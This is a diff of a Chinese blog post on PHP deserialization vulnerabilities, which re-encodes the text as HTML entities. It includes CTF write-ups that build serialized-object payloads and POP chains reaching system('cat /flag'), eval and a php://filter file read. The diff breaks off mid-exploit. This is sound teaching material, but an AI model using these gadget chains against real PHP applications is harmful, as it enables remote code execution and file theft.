@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>反序列化 | muruoze1的小窝</title><meta name="author" content="muruoze1"><meta name="copyright" content="muruoze1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简述 反序列化是一种将序列化对象还原成 PHP 对象的过程。通过序列化对象，可以将其存储到文件或数据库中，或者通过网络在不同的 PHP 应用程序之间传输数据。因此，反序列化操作通常与数据持久化和远程过程调用 (RPC) 相关。 在 PHP 中，可以通过 unserialize() 函数进行反序列化操作。该函数将接受一个字符串参数，该字符串包含序列化后的对象数据，然后返回已解压的 PHP 对象。 说">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>反序列化 | muruoze1的小窝</title><meta name="author" content="muruoze1"><meta name="copyright" content="muruoze1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="&#x7B80;&#x8FF0; &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x662F;&#x4E00;&#x79CD;&#x5C06;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x8FD8;&#x539F;&#x6210; PHP &#x5BF9;&#x8C61;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反序列化">
 <meta property="og:url" content="http://example.com/2024/07/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/index.html">
 <meta property="og:site_name" content="muruoze1的小窝">
-<meta property="og:description" content="简述 反序列化是一种将序列化对象还原成 PHP 对象的过程。通过序列化对象，可以将其存储到文件或数据库中，或者通过网络在不同的 PHP 应用程序之间传输数据。因此，反序列化操作通常与数据持久化和远程过程调用 (RPC) 相关。 在 PHP 中，可以通过 unserialize() 函数进行反序列化操作。该函数将接受一个字符串参数，该字符串包含序列化后的对象数据，然后返回已解压的 PHP 对象。 说">
+<meta property="og:description" content="&#x7B80;&#x8FF0; &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x662F;&#x4E00;&#x79CD;&#x5C06;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x8FD8;&#x539F;&#x6210; PHP &#x5BF9;&#x8C61;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&amp;#">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:published_time" content="2024-07-10T11:13:11.000Z">
@@ -152,264 +152,264 @@
         }
       }
       detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="../../../../archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="../../../../tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="../../../../categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="../../../../index.html" title="muruoze1的小窝"><span class="site-name">muruoze1的小窝</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-10T11:13:11.000Z" title="发表于 2024-07-10 19:13:11">2024-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-10T11:14:46.482Z" title="更新于 2024-07-10 19:14:46">2024-07-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>简述</p>
-<p>反序列化是一种将序列化对象还原成 PHP 对象的过程。通过序列化对象，可以将其存储到文件或数据库中，或者通过网络在不同的 PHP 应用程序之间传输数据。因此，反序列化操作通常与数据持久化和远程过程调用 (RPC) 相关。</p>
-<p>在 PHP 中，可以通过 unserialize() 函数进行反序列化操作。该函数将接受一个字符串参数，该字符串包含序列化后的对象数据，然后返回已解压的 PHP 对象。</p>
-<p>说白了；序列化就是将对象序列化成字符串，以便快速访问</p>
-<p>反序列化就是对已序列化的内容，还原成php对象<br>类与对象</p>
-<p>这里再简单提一下类与对象，类是一种自定义的数据类型，用于定义对象的属性（数据）和方法（行为）</p>
-<pre><code>class Car &#123;
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="../../../../archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="../../../../tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="../../../../categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="../../../../index.html" title="muruoze1的小窝"><span class="site-name">muruoze1的小窝</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-10T11:13:11.000Z" title="发表于 2024-07-10 19:13:11">2024-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-10T11:14:46.482Z" title="更新于 2024-07-10 19:14:46">2024-07-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>&#x7B80;&#x8FF0;</p>
+<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x662F;&#x4E00;&#x79CD;&#x5C06;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x8FD8;&#x539F;&#x6210; PHP &#x5BF9;&#x8C61;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x901A;&#x8FC7;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x5B58;&#x50A8;&#x5230;&#x6587;&#x4EF6;&#x6216;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x5728;&#x4E0D;&#x540C;&#x7684; PHP &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E4B;&#x95F4;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x901A;&#x5E38;&#x4E0E;&#x6570;&#x636E;&#x6301;&#x4E45;&#x5316;&#x548C;&#x8FDC;&#x7A0B;&#x8FC7;&#x7A0B;&#x8C03;&#x7528; (RPC) &#x76F8;&#x5173;&#x3002;</p>
+<p>&#x5728; PHP &#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; unserialize() &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x3002;&#x8BE5;&#x51FD;&#x6570;&#x5C06;&#x63A5;&#x53D7;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x53C2;&#x6570;&#xFF0C;&#x8BE5;&#x5B57;&#x7B26;&#x4E32;&#x5305;&#x542B;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x8FD4;&#x56DE;&#x5DF2;&#x89E3;&#x538B;&#x7684; PHP &#x5BF9;&#x8C61;&#x3002;</p>
+<p>&#x8BF4;&#x767D;&#x4E86;&#xFF1B;&#x5E8F;&#x5217;&#x5316;&#x5C31;&#x662F;&#x5C06;&#x5BF9;&#x8C61;&#x5E8F;&#x5217;&#x5316;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4EE5;&#x4FBF;&#x5FEB;&#x901F;&#x8BBF;&#x95EE;</p>
+<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C31;&#x662F;&#x5BF9;&#x5DF2;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD8;&#x539F;&#x6210;php&#x5BF9;&#x8C61;<br>&#x7C7B;&#x4E0E;&#x5BF9;&#x8C61;</p>
+<p>&#x8FD9;&#x91CC;&#x518D;&#x7B80;&#x5355;&#x63D0;&#x4E00;&#x4E0B;&#x7C7B;&#x4E0E;&#x5BF9;&#x8C61;&#xFF0C;&#x7C7B;&#x662F;&#x4E00;&#x79CD;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#xFF08;&#x6570;&#x636E;&#xFF09;&#x548C;&#x65B9;&#x6CD5;&#xFF08;&#x884C;&#x4E3A;&#xFF09;</p>
+<pre><code>class Car {
     public $brand;
     public $model;
     
-    public function __construct($brand, $model) &#123;
+    public function __construct($brand, $model) {
         $this-&gt;brand = $brand;
         $this-&gt;model = $model;
-    &#125;
+    }
     
-    public function startEngine() &#123;
+    public function startEngine() {
         echo &quot;Starting the $this-&gt;brand $this-&gt;model engine.&quot;;
-    &#125;
-&#125;
+    }
+}
  
 $car = new Car(&quot;Toyota&quot;, &quot;Camry&quot;);
 $car-&gt;startEngine();
 </code></pre>
-<p>看一段简单的代码，这里我们看到，在类Car中，有两个对象brand,model ，同时应用了_construct魔术方法，它是构造函数，是一个在对象被创建时自动调用的方法，用于执行一些初始化操作。（我们看到下文创建了对象Car并赋值给变量car，因此此魔术方法是能够触发的），所以，当代码运行后，我们会初始化对象Car,并将其中的属性brand,model分别赋值（$this-&gt;brand&#x3D;$brand表示访问对象Car中的brand属性并赋值）</p>
-<p>接下来我们看到，它定义了一个函数startEngine，它将brand 和 model的值输入到字符串中，并通过echo输出了一句话。这是一个关于类，对象，方法等的一个小实例<br>反序列化漏洞与实战</p>
-<p>PHP 中的反序列化漏洞是指在反序列化过程中，未正确验证和过滤输入数据，导致攻击者可以构造恶意的序列化数据进行利用的安全漏洞。</p>
-<p>简单来说，在进行反序列化后，我们可以利用魔术方法等，找到一条利用链，传递一段合适的字符串完成攻击操作</p>
-<p>序列化后，对象变为字符串，形式大致如下</p>
-<p>O:4:”Car”:2:{s:5:”brand”;s:6:”Toyota”;s:5:”model”;s:5:”Camry”;}</p>
-<p>其中O代表对象，后面的s代表字符串类型，这样一段字符串包含了对象的属性的一些简单信息，我们通过传入类似的字符串或许可以达成我们的目的</p>
-<p>那么让我们看看反序列化的题目<br>[SWPUCTF 2022 新生赛]1z_unserialize</p>
+<p>&#x770B;&#x4E00;&#x6BB5;&#x7B80;&#x5355;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x770B;&#x5230;&#xFF0C;&#x5728;&#x7C7B;Car&#x4E2D;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x5BF9;&#x8C61;brand,model &#xFF0C;&#x540C;&#x65F6;&#x5E94;&#x7528;&#x4E86;_construct&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;&#x5B83;&#x662F;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x5728;&#x5BF9;&#x8C61;&#x88AB;&#x521B;&#x5EFA;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x4E00;&#x4E9B;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x3002;&#xFF08;&#x6211;&#x4EEC;&#x770B;&#x5230;&#x4E0B;&#x6587;&#x521B;&#x5EFA;&#x4E86;&#x5BF9;&#x8C61;Car&#x5E76;&#x8D4B;&#x503C;&#x7ED9;&#x53D8;&#x91CF;car&#xFF0C;&#x56E0;&#x6B64;&#x6B64;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x662F;&#x80FD;&#x591F;&#x89E6;&#x53D1;&#x7684;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x5F53;&#x4EE3;&#x7801;&#x8FD0;&#x884C;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x521D;&#x59CB;&#x5316;&#x5BF9;&#x8C61;Car,&#x5E76;&#x5C06;&#x5176;&#x4E2D;&#x7684;&#x5C5E;&#x6027;brand,model&#x5206;&#x522B;&#x8D4B;&#x503C;&#xFF08;$this-&gt;brand=$brand&#x8868;&#x793A;&#x8BBF;&#x95EE;&#x5BF9;&#x8C61;Car&#x4E2D;&#x7684;brand&#x5C5E;&#x6027;&#x5E76;&#x8D4B;&#x503C;&#xFF09;</p>
+<p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x770B;&#x5230;&#xFF0C;&#x5B83;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x51FD;&#x6570;startEngine&#xFF0C;&#x5B83;&#x5C06;brand &#x548C; model&#x7684;&#x503C;&#x8F93;&#x5165;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;echo&#x8F93;&#x51FA;&#x4E86;&#x4E00;&#x53E5;&#x8BDD;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5173;&#x4E8E;&#x7C7B;&#xFF0C;&#x5BF9;&#x8C61;&#xFF0C;&#x65B9;&#x6CD5;&#x7B49;&#x7684;&#x4E00;&#x4E2A;&#x5C0F;&#x5B9E;&#x4F8B;<br>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x4E0E;&#x5B9E;&#x6218;</p>
+<p>PHP &#x4E2D;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x662F;&#x6307;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x672A;&#x6B63;&#x786E;&#x9A8C;&#x8BC1;&#x548C;&#x8FC7;&#x6EE4;&#x8F93;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x5BFC;&#x81F4;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x6076;&#x610F;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x3002;</p>
+<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7B49;&#xFF0C;&#x627E;&#x5230;&#x4E00;&#x6761;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x4F20;&#x9012;&#x4E00;&#x6BB5;&#x5408;&#x9002;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5B8C;&#x6210;&#x653B;&#x51FB;&#x64CD;&#x4F5C;</p>
+<p>&#x5E8F;&#x5217;&#x5316;&#x540E;&#xFF0C;&#x5BF9;&#x8C61;&#x53D8;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5F62;&#x5F0F;&#x5927;&#x81F4;&#x5982;&#x4E0B;</p>
+<p>O:4:&#x201D;Car&#x201D;:2:{s:5:&#x201D;brand&#x201D;;s:6:&#x201D;Toyota&#x201D;;s:5:&#x201D;model&#x201D;;s:5:&#x201D;Camry&#x201D;;}</p>
+<p>&#x5176;&#x4E2D;O&#x4EE3;&#x8868;&#x5BF9;&#x8C61;&#xFF0C;&#x540E;&#x9762;&#x7684;s&#x4EE3;&#x8868;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x6BB5;&#x5B57;&#x7B26;&#x4E32;&#x5305;&#x542B;&#x4E86;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x7684;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x7C7B;&#x4F3C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8BB8;&#x53EF;&#x4EE5;&#x8FBE;&#x6210;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x7684;</p>
+<p>&#x90A3;&#x4E48;&#x8BA9;&#x6211;&#x4EEC;&#x770B;&#x770B;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x9898;&#x76EE;<br>[SWPUCTF 2022 &#x65B0;&#x751F;&#x8D5B;]1z_unserialize</p>
 <pre><code>&lt;?php
  
-class lyh&#123;
-    public $url = &#39;NSSCTF.com&#39;;
+class lyh{
+    public $url = &apos;NSSCTF.com&apos;;
     public $lt;
     public $lly;
      
      function  __destruct()
-     &#123;
+     {
         $a = $this-&gt;lt;
  
         $a($this-&gt;lly);
-     &#125;
+     }
 </code></pre>
-<p>​        </p>
-<pre><code>&#125;
-unserialize($_POST[&#39;nss&#39;]);
+<p>&#x200B;        </p>
+<pre><code>}
+unserialize($_POST[&apos;nss&apos;]);
 highlight_file(__FILE__);
 </code></pre>
-<p>​     </p>
+<p>&#x200B;     </p>
 <pre><code>?&gt; 
 </code></pre>
-<p>__destruct 方法在对象销毁时会自动调用，这是一道结合了命令执行的题目，我们如果令a&#x3D;system(),lly&#x3D;cat &#x2F;flag，即可完成</p>
+<p>__destruct &#x65B9;&#x6CD5;&#x5728;&#x5BF9;&#x8C61;&#x9500;&#x6BC1;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x9053;&#x7ED3;&#x5408;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x5982;&#x679C;&#x4EE4;a=system(),lly=cat /flag&#xFF0C;&#x5373;&#x53EF;&#x5B8C;&#x6210;</p>
 <pre><code>&lt;?php
-  class lyh&#123;
-    public $url = &#39;NSSCTF.com&#39;;
+  class lyh{
+    public $url = &apos;NSSCTF.com&apos;;
     public $lt=&quot;system&quot;;
     public $lly=&quot;cat /flag&quot;;
      
      function  __destruct()
-     &#123;
+     {
         $a = $this-&gt;lt;
  
         $a($this-&gt;lly);
-     &#125;
+     }
 </code></pre>
-<p>​        </p>
-<pre><code>&#125;
+<p>&#x200B;        </p>
+<pre><code>}
 $a= new lyh();
 echo serialize($a);
 ?&gt; 
 </code></pre>
-<p>得到O:3:”lyh”:3:{s:3:”url”;s:10:”NSSCTF.com”;s:2:”lt”;s:6:”system”;s:3:”lly”;s:9:”cat &#x2F;flag”;}</p>
-<p>post传参（写的时候一开始整成get了）</p>
+<p>&#x5F97;&#x5230;O:3:&#x201D;lyh&#x201D;:3:{s:3:&#x201D;url&#x201D;;s:10:&#x201D;NSSCTF.com&#x201D;;s:2:&#x201D;lt&#x201D;;s:6:&#x201D;system&#x201D;;s:3:&#x201D;lly&#x201D;;s:9:&#x201D;cat /flag&#x201D;;}</p>
+<p>post&#x4F20;&#x53C2;&#xFF08;&#x5199;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x5F00;&#x59CB;&#x6574;&#x6210;get&#x4E86;&#xFF09;</p>
 <p>[MoeCTF 2021]unserialize</p>
 <pre><code> &lt;?php
  
 class entrance
-&#123;
+{
     public $start;
  
     function __construct($start)
-    &#123;
+    {
         $this-&gt;start = $start;
-    &#125;
+    }
  
     function __destruct()
-    &#123;
+    {
         $this-&gt;start-&gt;helloworld();
-    &#125;
-&#125;
+    }
+}
  
 class springboard
-&#123;
+{
     public $middle;
  
     function __call($name, $arguments)
-    &#123;
+    {
         echo $this-&gt;middle-&gt;hs;
-    &#125;
-&#125;
+    }
+}
  
 class evil
-&#123;
+{
     public $end;
  
     function __construct($end)
-    &#123;
+    {
         $this-&gt;end = $end;
-    &#125;
+    }
  
     function __get($Attribute)
-    &#123;
+    {
         eval($this-&gt;end);
-    &#125;
-&#125;
+    }
+}
  
-if(isset($_GET[&#39;serialize&#39;])) &#123;
-    unserialize($_GET[&#39;serialize&#39;]);
-&#125; else &#123;
+if(isset($_GET[&apos;serialize&apos;])) {
+    unserialize($_GET[&apos;serialize&apos;]);
+} else {
     highlight_file(__FILE__);
-&#125; 
+} 
 </code></pre>
-<p> 显然利用点是eval,想办法让eval执行cat &#x2F;flag,我们满足get,也就是需要访问evil不存在的属性，我们找到call，call的触发条件是调用不存在的方法，再找到destruct,触发它后会调用方法hello world()</p>
-<p>利用链：evil::__get()&lt;–springboard::__call()&lt;–entrance::__destruct()</p>
+<p> &#x663E;&#x7136;&#x5229;&#x7528;&#x70B9;&#x662F;eval,&#x60F3;&#x529E;&#x6CD5;&#x8BA9;eval&#x6267;&#x884C;cat /flag,&#x6211;&#x4EEC;&#x6EE1;&#x8DB3;get,&#x4E5F;&#x5C31;&#x662F;&#x9700;&#x8981;&#x8BBF;&#x95EE;evil&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x627E;&#x5230;call&#xFF0C;call&#x7684;&#x89E6;&#x53D1;&#x6761;&#x4EF6;&#x662F;&#x8C03;&#x7528;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x518D;&#x627E;&#x5230;destruct,&#x89E6;&#x53D1;&#x5B83;&#x540E;&#x4F1A;&#x8C03;&#x7528;&#x65B9;&#x6CD5;hello world()</p>
+<p>&#x5229;&#x7528;&#x94FE;&#xFF1A;evil::__get()&lt;&#x2013;springboard::__call()&lt;&#x2013;entrance::__destruct()</p>
 <pre><code>&lt;?php
 class entrance
-&#123;
+{
 public $start;
-&#125;
+}
  
 class springboard
-&#123;
+{
 public $middle;
-&#125;
+}
  
 class evil
-&#123;
+{
 public $end;
-&#125;
+}
  
 $a = new entrance();
 $a-&gt;start=new springboard();
 $a-&gt;start-&gt;middle = new evil();
-$a-&gt;start-&gt;middle-&gt;end = &quot;system(&#39;cat /flag&#39;);&quot;;
+$a-&gt;start-&gt;middle-&gt;end = &quot;system(&apos;cat /flag&apos;);&quot;;
 $a = serialize($a);
 echo $a;
 ?&gt;
 </code></pre>
-<p>在这个示例中，序列化的结果中只包含了对象的属性信息，具体包括</p>
+<p>&#x5728;&#x8FD9;&#x4E2A;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7ED3;&#x679C;&#x4E2D;&#x53EA;&#x5305;&#x542B;&#x4E86;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x4FE1;&#x606F;&#xFF0C;&#x5177;&#x4F53;&#x5305;&#x62EC;</p>
 <p>[MRCTF2020]Ezpop</p>
 <pre><code>Welcome to index.php
 &lt;?php
 //flag is in flag.php
-class Modifier &#123;
+class Modifier {
     protected  $var;
-    public function append($value)&#123;
+    public function append($value){
         include($value);
-    &#125;
-    public function __invoke()&#123;
+    }
+    public function __invoke(){
         $this-&gt;append($this-&gt;var);
-    &#125;
-&#125;
+    }
+}
  
-class Show&#123;
+class Show{
     public $source;
     public $str;
-    public function __construct($file=&#39;index.php&#39;)&#123;
+    public function __construct($file=&apos;index.php&apos;){
         $this-&gt;source = $file;
-        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
-    &#125;
-    public function __toString()&#123;
+        echo &apos;Welcome to &apos;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    }
+    public function __toString(){
         return $this-&gt;str-&gt;source;
-    &#125;
+    }
  
-    public function __wakeup()&#123;
-        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+    public function __wakeup(){
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
             echo &quot;hacker&quot;;
             $this-&gt;source = &quot;index.php&quot;;
-        &#125;
-    &#125;
-&#125;
+        }
+    }
+}
  
-class Test&#123;
+class Test{
     public $p;
-    public function __construct()&#123;
+    public function __construct(){
         $this-&gt;p = array();
-    &#125;
+    }
  
-    public function __get($key)&#123;
+    public function __get($key){
         $function = $this-&gt;p;
         return $function();
-    &#125;
-&#125;
+    }
+}
  
-if(isset($_GET[&#39;pop&#39;]))&#123;
-    @unserialize($_GET[&#39;pop&#39;]);
-&#125;
-else&#123;
+if(isset($_GET[&apos;pop&apos;])){
+    @unserialize($_GET[&apos;pop&apos;]);
+}
+else{
     $a=new Show;
     highlight_file(__FILE__);
-&#125;
+}
 </code></pre>
-<p>这题是寻找利用链，一步一步达到最终的结果，首先我们来找利用点，应该是Modifier类中的include()函数，我们要想办法令value等于flag.php，并利用魔术方法一步一步来到include()的触发</p>
-<p>思路：</p>
-<p>序列化时自动触发wakeup,创造一个对象Show，由于preg_match,触发_tostring</p>
-<p>触发Show类的_tostring后访问Test类不存在的对象，从而触发Test类的_get</p>
-<p>_get触发后让p为Modifier对象，使Modifier作为函数被调用而触发_invoke（）</p>
+<p>&#x8FD9;&#x9898;&#x662F;&#x5BFB;&#x627E;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x4E00;&#x6B65;&#x4E00;&#x6B65;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x627E;&#x5229;&#x7528;&#x70B9;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;Modifier&#x7C7B;&#x4E2D;&#x7684;include()&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x4EE4;value&#x7B49;&#x4E8E;flag.php&#xFF0C;&#x5E76;&#x5229;&#x7528;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E00;&#x6B65;&#x4E00;&#x6B65;&#x6765;&#x5230;include()&#x7684;&#x89E6;&#x53D1;</p>
+<p>&#x601D;&#x8DEF;&#xFF1A;</p>
+<p>&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x81EA;&#x52A8;&#x89E6;&#x53D1;wakeup,&#x521B;&#x9020;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;Show&#xFF0C;&#x7531;&#x4E8E;preg_match,&#x89E6;&#x53D1;_tostring</p>
+<p>&#x89E6;&#x53D1;Show&#x7C7B;&#x7684;_tostring&#x540E;&#x8BBF;&#x95EE;Test&#x7C7B;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x4ECE;&#x800C;&#x89E6;&#x53D1;Test&#x7C7B;&#x7684;_get</p>
+<p>_get&#x89E6;&#x53D1;&#x540E;&#x8BA9;p&#x4E3A;Modifier&#x5BF9;&#x8C61;&#xFF0C;&#x4F7F;Modifier&#x4F5C;&#x4E3A;&#x51FD;&#x6570;&#x88AB;&#x8C03;&#x7528;&#x800C;&#x89E6;&#x53D1;_invoke&#xFF08;&#xFF09;</p>
 <pre><code>&lt;?php
-class Modifier &#123;
-    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;//这是特殊的 PHP 过滤器，它将读取文件 “flag.php” 的内容并以 Base64 编码的形式返回。
-&#125;
+class Modifier {
